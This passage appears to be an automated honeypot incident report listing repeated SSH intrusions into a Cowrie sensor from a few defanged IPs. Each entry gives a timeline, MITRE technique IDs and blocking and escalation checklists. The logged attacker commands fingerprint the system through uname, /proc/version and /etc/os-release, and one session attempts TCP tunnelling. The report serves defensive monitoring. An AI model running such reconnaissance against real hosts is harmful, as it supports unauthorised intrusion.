| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:44:40` | `cowrie.session.connect` |
| `2026-08-11 13:44:40` | `cowrie.client.version` |
| `2026-08-11 13:44:41` | `cowrie.client.kex` |
| `2026-08-11 13:44:42` | `cowrie.login.success` |
| `2026-08-11 13:44:43` | `cowrie.session.params` |
| `2026-08-11 13:44:43` | `cowrie.command.input` |
| `2026-08-11 13:44:43` | `cowrie.command.input` |
| `2026-08-11 13:44:43` | `cowrie.command.input` |
| `2026-08-11 13:44:43` | `cowrie.command.input` |
| `2026-08-11 13:44:43` | `cowrie.command.input` |
| `2026-08-11 13:44:43` | `cowrie.command.success` |
| `2026-08-11 13:44:43` | `cowrie.command.input` |
| `2026-08-11 13:44:43` | `cowrie.command.input` |
| `2026-08-11 13:44:43` | `cowrie.command.input` |
| `2026-08-11 13:44:43` | `cowrie.command.input` |
| `2026-08-11 13:44:43` | `cowrie.log.closed` |
| `2026-08-11 13:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d160fd90d8fd

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:44 |
| **Last Seen** | 2026-08-11 13:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:44:54` | `cowrie.session.connect` |
| `2026-08-11 13:44:54` | `cowrie.client.version` |
| `2026-08-11 13:44:54` | `cowrie.client.kex` |
| `2026-08-11 13:44:54` | `cowrie.login.success` |
| `2026-08-11 13:44:55` | `cowrie.session.params` |
| `2026-08-11 13:44:55` | `cowrie.command.input` |
| `2026-08-11 13:44:55` | `cowrie.log.closed` |
| `2026-08-11 13:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57e546693f71

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:44 |
| **Last Seen** | 2026-08-11 13:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:44:55` | `cowrie.session.connect` |
| `2026-08-11 13:44:55` | `cowrie.client.version` |
| `2026-08-11 13:44:55` | `cowrie.client.kex` |
| `2026-08-11 13:44:55` | `cowrie.login.success` |
| `2026-08-11 13:44:56` | `cowrie.session.params` |
| `2026-08-11 13:44:56` | `cowrie.command.input` |
| `2026-08-11 13:44:56` | `cowrie.log.closed` |
| `2026-08-11 13:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e207d8eab358

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:46 |
| **Last Seen** | 2026-08-11 13:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:46:33` | `cowrie.session.connect` |
| `2026-08-11 13:46:33` | `cowrie.client.version` |
| `2026-08-11 13:46:33` | `cowrie.client.kex` |
| `2026-08-11 13:46:33` | `cowrie.login.success` |
| `2026-08-11 13:46:34` | `cowrie.session.params` |
| `2026-08-11 13:46:34` | `cowrie.command.input` |
| `2026-08-11 13:46:34` | `cowrie.log.closed` |
| `2026-08-11 13:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab80ca3d5e15

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:46 |
| **Last Seen** | 2026-08-11 13:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:46:35` | `cowrie.session.connect` |
| `2026-08-11 13:46:35` | `cowrie.client.version` |
| `2026-08-11 13:46:35` | `cowrie.client.kex` |
| `2026-08-11 13:46:37` | `cowrie.login.success` |
| `2026-08-11 13:46:38` | `cowrie.session.params` |
| `2026-08-11 13:46:38` | `cowrie.command.input` |
| `2026-08-11 13:46:38` | `cowrie.command.input` |
| `2026-08-11 13:46:38` | `cowrie.command.input` |
| `2026-08-11 13:46:38` | `cowrie.command.input` |
| `2026-08-11 13:46:38` | `cowrie.command.input` |
| `2026-08-11 13:46:38` | `cowrie.command.success` |
| `2026-08-11 13:46:38` | `cowrie.command.input` |
| `2026-08-11 13:46:38` | `cowrie.command.input` |
| `2026-08-11 13:46:38` | `cowrie.command.input` |
| `2026-08-11 13:46:38` | `cowrie.command.input` |
| `2026-08-11 13:46:38` | `cowrie.log.closed` |
| `2026-08-11 13:46:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b54cd31c0f6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:48 |
| **Last Seen** | 2026-08-11 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:48:08` | `cowrie.session.connect` |
| `2026-08-11 13:48:08` | `cowrie.client.version` |
| `2026-08-11 13:48:08` | `cowrie.client.kex` |
| `2026-08-11 13:48:08` | `cowrie.login.success` |
| `2026-08-11 13:48:09` | `cowrie.session.params` |
| `2026-08-11 13:48:09` | `cowrie.command.input` |
| `2026-08-11 13:48:09` | `cowrie.log.closed` |
| `2026-08-11 13:48:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b08b0920d98

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:48 |
| **Last Seen** | 2026-08-11 13:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:48:30` | `cowrie.session.connect` |
| `2026-08-11 13:48:30` | `cowrie.client.version` |
| `2026-08-11 13:48:30` | `cowrie.client.kex` |
| `2026-08-11 13:48:32` | `cowrie.login.success` |
| `2026-08-11 13:48:33` | `cowrie.session.params` |
| `2026-08-11 13:48:33` | `cowrie.command.input` |
| `2026-08-11 13:48:33` | `cowrie.command.input` |
| `2026-08-11 13:48:33` | `cowrie.command.input` |
| `2026-08-11 13:48:33` | `cowrie.command.input` |
| `2026-08-11 13:48:33` | `cowrie.command.input` |
| `2026-08-11 13:48:33` | `cowrie.command.success` |
| `2026-08-11 13:48:33` | `cowrie.command.input` |
| `2026-08-11 13:48:33` | `cowrie.command.input` |
| `2026-08-11 13:48:33` | `cowrie.command.input` |
| `2026-08-11 13:48:33` | `cowrie.command.input` |
| `2026-08-11 13:48:33` | `cowrie.log.closed` |
| `2026-08-11 13:48:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063310d30625

| Field | Detail |
|---|---|
| **Source IP** | `66.45.144[.]201` |
| **First Seen** | 2026-08-11 13:48 |
| **Last Seen** | 2026-08-11 13:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:48:41` | `cowrie.session.connect` |
| `2026-08-11 13:48:42` | `cowrie.client.version` |
| `2026-08-11 13:48:42` | `cowrie.client.kex` |
| `2026-08-11 13:48:43` | `cowrie.login.success` |
| `2026-08-11 13:48:43` | `cowrie.direct-tcpip.request` |
| `2026-08-11 13:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.144[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.144[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5424b1fa83ec

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:49 |
| **Last Seen** | 2026-08-11 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:49:40` | `cowrie.session.connect` |
| `2026-08-11 13:49:40` | `cowrie.client.version` |
| `2026-08-11 13:49:40` | `cowrie.client.kex` |
| `2026-08-11 13:49:40` | `cowrie.login.success` |
| `2026-08-11 13:49:41` | `cowrie.session.params` |
| `2026-08-11 13:49:41` | `cowrie.command.input` |
| `2026-08-11 13:49:41` | `cowrie.log.closed` |
| `2026-08-11 13:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9728f8df28

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:50 |
| **Last Seen** | 2026-08-11 13:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:50:18` | `cowrie.session.connect` |
| `2026-08-11 13:50:18` | `cowrie.client.version` |
| `2026-08-11 13:50:18` | `cowrie.client.kex` |
| `2026-08-11 13:50:18` | `cowrie.login.success` |
| `2026-08-11 13:50:19` | `cowrie.session.params` |
| `2026-08-11 13:50:19` | `cowrie.command.input` |
| `2026-08-11 13:50:19` | `cowrie.log.closed` |
| `2026-08-11 13:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc6df6e866cd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:50 |
| **Last Seen** | 2026-08-11 13:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:50:25` | `cowrie.session.connect` |
| `2026-08-11 13:50:25` | `cowrie.client.version` |
| `2026-08-11 13:50:25` | `cowrie.client.kex` |
| `2026-08-11 13:50:27` | `cowrie.login.success` |
| `2026-08-11 13:50:28` | `cowrie.session.params` |
| `2026-08-11 13:50:28` | `cowrie.command.input` |
| `2026-08-11 13:50:28` | `cowrie.command.input` |
| `2026-08-11 13:50:28` | `cowrie.command.input` |
| `2026-08-11 13:50:28` | `cowrie.command.input` |
| `2026-08-11 13:50:28` | `cowrie.command.input` |
| `2026-08-11 13:50:28` | `cowrie.command.success` |
| `2026-08-11 13:50:28` | `cowrie.command.input` |
| `2026-08-11 13:50:28` | `cowrie.command.input` |
| `2026-08-11 13:50:28` | `cowrie.command.input` |
| `2026-08-11 13:50:28` | `cowrie.command.input` |
| `2026-08-11 13:50:28` | `cowrie.log.closed` |
| `2026-08-11 13:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f412b26ec7e3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:51 |
| **Last Seen** | 2026-08-11 13:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:51:14` | `cowrie.session.connect` |
| `2026-08-11 13:51:14` | `cowrie.client.version` |
| `2026-08-11 13:51:14` | `cowrie.client.kex` |
| `2026-08-11 13:51:14` | `cowrie.login.success` |
| `2026-08-11 13:51:15` | `cowrie.session.params` |
| `2026-08-11 13:51:15` | `cowrie.command.input` |
| `2026-08-11 13:51:15` | `cowrie.log.closed` |
| `2026-08-11 13:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e1e967355dd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:52 |
| **Last Seen** | 2026-08-11 13:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:52:18` | `cowrie.session.connect` |
| `2026-08-11 13:52:18` | `cowrie.client.version` |
| `2026-08-11 13:52:18` | `cowrie.client.kex` |
| `2026-08-11 13:52:19` | `cowrie.login.success` |
| `2026-08-11 13:52:20` | `cowrie.session.params` |
| `2026-08-11 13:52:20` | `cowrie.command.input` |
| `2026-08-11 13:52:20` | `cowrie.command.input` |
| `2026-08-11 13:52:20` | `cowrie.command.input` |
| `2026-08-11 13:52:20` | `cowrie.command.input` |
| `2026-08-11 13:52:20` | `cowrie.command.input` |
| `2026-08-11 13:52:20` | `cowrie.command.success` |
| `2026-08-11 13:52:20` | `cowrie.command.input` |
| `2026-08-11 13:52:20` | `cowrie.command.input` |
| `2026-08-11 13:52:20` | `cowrie.command.input` |
| `2026-08-11 13:52:20` | `cowrie.command.input` |
| `2026-08-11 13:52:20` | `cowrie.log.closed` |
| `2026-08-11 13:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cfb8c8f1fa7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:52 |
| **Last Seen** | 2026-08-11 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:52:53` | `cowrie.session.connect` |
| `2026-08-11 13:52:53` | `cowrie.client.version` |
| `2026-08-11 13:52:53` | `cowrie.client.kex` |
| `2026-08-11 13:52:54` | `cowrie.login.success` |
| `2026-08-11 13:52:54` | `cowrie.session.params` |
| `2026-08-11 13:52:54` | `cowrie.command.input` |
| `2026-08-11 13:52:54` | `cowrie.log.closed` |
| `2026-08-11 13:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ab87be62c2d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:53 |
| **Last Seen** | 2026-08-11 13:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:53:02` | `cowrie.session.connect` |
| `2026-08-11 13:53:02` | `cowrie.client.version` |
| `2026-08-11 13:53:02` | `cowrie.client.kex` |
| `2026-08-11 13:53:03` | `cowrie.login.success` |
| `2026-08-11 13:53:04` | `cowrie.session.params` |
| `2026-08-11 13:53:04` | `cowrie.command.input` |
| `2026-08-11 13:53:04` | `cowrie.log.closed` |
| `2026-08-11 13:53:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c777cfda9370

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:54 |
| **Last Seen** | 2026-08-11 13:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:54:10` | `cowrie.session.connect` |
| `2026-08-11 13:54:11` | `cowrie.client.version` |
| `2026-08-11 13:54:11` | `cowrie.client.kex` |
| `2026-08-11 13:54:12` | `cowrie.login.success` |
| `2026-08-11 13:54:13` | `cowrie.session.params` |
| `2026-08-11 13:54:13` | `cowrie.command.input` |
| `2026-08-11 13:54:13` | `cowrie.command.input` |
| `2026-08-11 13:54:13` | `cowrie.command.input` |
| `2026-08-11 13:54:13` | `cowrie.command.input` |
| `2026-08-11 13:54:13` | `cowrie.command.input` |
| `2026-08-11 13:54:13` | `cowrie.command.success` |
| `2026-08-11 13:54:13` | `cowrie.command.input` |
| `2026-08-11 13:54:13` | `cowrie.command.input` |
| `2026-08-11 13:54:13` | `cowrie.command.input` |
| `2026-08-11 13:54:13` | `cowrie.command.input` |
| `2026-08-11 13:54:13` | `cowrie.log.closed` |
| `2026-08-11 13:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0826bf33ce52

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:54 |
| **Last Seen** | 2026-08-11 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:54:34` | `cowrie.session.connect` |
| `2026-08-11 13:54:34` | `cowrie.client.version` |
| `2026-08-11 13:54:34` | `cowrie.client.kex` |
| `2026-08-11 13:54:34` | `cowrie.login.success` |
| `2026-08-11 13:54:35` | `cowrie.session.params` |
| `2026-08-11 13:54:35` | `cowrie.command.input` |
| `2026-08-11 13:54:35` | `cowrie.log.closed` |
| `2026-08-11 13:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbba6b52c1eb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:55 |
| **Last Seen** | 2026-08-11 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:55:47` | `cowrie.session.connect` |
| `2026-08-11 13:55:47` | `cowrie.client.version` |
| `2026-08-11 13:55:48` | `cowrie.client.kex` |
| `2026-08-11 13:55:48` | `cowrie.login.success` |
| `2026-08-11 13:55:49` | `cowrie.session.params` |
| `2026-08-11 13:55:49` | `cowrie.command.input` |
| `2026-08-11 13:55:49` | `cowrie.log.closed` |
| `2026-08-11 13:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-844732cfbbd5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:55 |
| **Last Seen** | 2026-08-11 13:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

